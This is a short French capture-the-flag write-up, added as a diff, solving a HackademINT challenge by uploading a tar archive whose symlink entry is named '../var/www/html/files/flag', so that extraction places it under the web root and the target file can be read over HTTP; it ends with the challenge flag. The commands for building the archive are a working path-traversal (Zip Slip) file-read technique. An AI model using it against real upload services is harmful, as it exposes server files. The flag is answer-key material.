@@ -1,0 +1,16 @@
+on génére un tar qui contient un lien symbolique vers /etc/flag
+et le nom du fichier permet de faire un path traversal ../var/www/html/files/flag
+
+- Créer un lien symbolique vers /etc/flag :
+$ touch /etc/flag
+$ ln -s /etc/flag flag
+
+- On utilise path_traversal_archiver.py [https://alamot.github.io/path_traversal_archiver/] pour créer une archive avec un fichier dont le nom peut contenir un chemin :
+$ python3 path_traversal_archiver.py -l 1 -p var/www/html/files/ flag flag.tar
+
+- Ainsi un fichier avec comme nom "../var/www/html/files/flag" est stocké dans l'archive
+- On upload l'archive sur le site
+- A la décompression dans /tmp, le nom du fichier est utilisé pour le placer dans /tmp/../var/www/html/files/ soit /var/www/html/files/
+- Alors on peut visiter la page http://challs2.hackademint.org:13401/files/flag et à la lecture le contenu de /etc/flag est lu car notre fichier est un lien symbolique vers celui-ci
+
+HackademINT{Z1p_Sl1p_iN_Pyth0n?}
